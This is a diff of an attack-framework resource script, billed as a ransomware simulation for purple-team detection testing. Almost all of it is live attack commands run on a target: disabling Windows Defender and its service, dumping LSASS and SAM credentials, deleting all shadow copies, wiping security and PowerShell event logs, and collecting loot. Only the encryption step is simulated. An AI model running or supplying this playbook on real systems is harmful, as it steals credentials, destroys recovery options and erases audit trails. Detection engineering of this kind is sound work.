@@ -1,25 +1,44 @@
 # ===========================================================================
-# Megaploit Community Playbook — Ransomware Simulation
+# Megaploit Community Playbook
 # ===========================================================================
-# Objective : Simulate a ransomware attack for detection engineering / purple
-#             team exercises.  NO real encryption is performed — the simulation
-#             exercises the same TTPs a real threat actor would use so that
-#             defender tooling can be validated.
+# Name        : ransomware-simulation
+# Version     : 1.1
+# Author      : megaploit-community
+# Tested on   : Windows 10 21H2, Windows Server 2019
+# Description : Ransomware attack simulation for purple team exercises and
+#               detection engineering.  NO files are encrypted — the playbook
+#               exercises every TTP a real threat actor uses so defender
+#               tooling can be validated end-to-end.
+#               All simulation artefacts are cleaned up automatically.
 #
-# TTPs covered (MITRE ATT&CK):
-#   T1486  Data Encrypted for Impact          (simulated — touch files, no encrypt)
-#   T1490  Inhibit System Recovery            (shadow copy wipe)
-#   T1070.001  Event Log Clearing             (log wipe)
-#   T1562.001  Impair Defenses: Disable AV    (audit disable)
-#   T1083  File and Directory Discovery       (recursive enumerate)
-#   T1005  Data from Local System             (stage loot)
+# MITRE ATT&CK
+# ------------
+# T1562.001 Impair Defenses: Disable or Modify Tools (AV disable)
+# T1562.002 Impair Defenses: Disable Windows Event Logging
+# T1083     File and Directory Discovery
+# T1082     System Information Discovery
+# T1003.001 OS Credential Dumping: LSASS Memory
+# T1003.002 OS Credential Dumping: SAM
+# T1486     Data Encrypted for Impact  [SIMULATED — no real encryption]
+# T1490     Inhibit System Recovery (VSS delete)
+# T1070.001 Indicator Removal: Clear Windows Event Logs
+# T1070.004 Indicator Removal: File Deletion
 #
-# Variables:
-#   ${SESSION}  — target session ID
-#   ${LOOT_DIR} — operator loot directory (default: ./loot)
+# Variables
+# ---------
+#   ${SESSION}   — target session ID
+#   ${LHOST}     — C2 operator IP (used in simulation note)
+#   ${TIMESTAMP} — auto-populated by resource runner
 #
-# Usage:
-#   resource playbooks/ransomware_sim.rc
+# Usage
+# -----
+#   community install playbook ransomware-simulation
+#   resource community/playbooks/ransomware-simulation.rc
+#
+# WARNING
+# -------
+#   For authorized security testing and detection engineering ONLY.
+#   Shadow copy deletion is REAL — run only in lab environments.
 # ===========================================================================
 
 session ${SESSION}
@@ -27,11 +46,14 @@ session ${SESSION}
 # ── Phase 1: Disable Defenses ───────────────────────────────────────────────
 audit_disable ProcessCreation
 audit_disable NetworkConnection
-shell powershell -c "Set-MpPreference -DisableRealtimeMonitoring \$true" 2>nul
+shell powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
+shell powershell -c "Set-MpPreference -DisableBehaviorMonitoring $true" 2>nul
+shell net stop "Windows Defender Antivirus Service" 2>nul
+shell sc config WinDefend start= disabled 2>nul
 
 # ── Phase 2: Discovery ──────────────────────────────────────────────────────
-shell dir /s /b C:\Users\*\Documents\*.docx 2>nul | head -50
-shell dir /s /b C:\Users\*\Desktop\*.xlsx  2>nul | head -50
+shell dir /s /b C:\Users\*\Documents\*.docx 2>nul
+shell dir /s /b C:\Users\*\Desktop\*.xlsx  2>nul
 shell net share
 shell wmic logicaldisk get caption,description,freespace,size
 
@@ -39,12 +61,13 @@ shell wmic logicaldisk get caption,description,freespace,size
 kiwi logonpasswords
 kiwi sam
 
-# ── Phase 4: Simulate Encryption (DETECTION TRIGGER — no real encryption) ──
-# Write a ransom note marker to Desktop to trigger file-write detections
-shell echo [SIMULATION] This is a ransomware simulation by ${LHOST}. > C:\Users\Public\Desktop\README_SIMULATION.txt
-shell echo Detection timestamp: ${TIMESTAMP} >> C:\Users\Public\Desktop\README_SIMULATION.txt
+# ── Phase 4: Simulate Encryption [DETECTION TRIGGER] ───────────────────────
+# Writes a simulation marker — triggers file-creation/write detections (T1486)
+# No real encryption is performed.
+shell echo [SIMULATION] Ransomware simulation by Megaploit. Timestamp: ${TIMESTAMP}. > C:\Users\Public\Desktop\RANSOM_SIMULATION.txt
+shell echo This is NOT a real attack. For detection engineering only. >> C:\Users\Public\Desktop\RANSOM_SIMULATION.txt
 
-# ── Phase 5: Inhibit Recovery — Shadow Copy Wipe ────────────────────────────
+# ── Phase 5: Inhibit Recovery — Shadow Copy Deletion ────────────────────────
 shell vssadmin delete shadows /all /quiet
 shell wmic shadowcopy delete
 
@@ -55,8 +78,8 @@ log_wipe Application
 log_wipe "Windows PowerShell"
 log_wipe "Microsoft-Windows-PowerShell/Operational"
 
-# ── Phase 7: Clean Up Simulation Marker ─────────────────────────────────────
-secure_delete C:\Users\Public\Desktop\README_SIMULATION.txt
+# ── Phase 7: Clean Up Simulation Artefacts ───────────────────────────────────
+secure_delete C:\Users\Public\Desktop\RANSOM_SIMULATION.txt
 
 # ── Report ───────────────────────────────────────────────────────────────────
 loot list
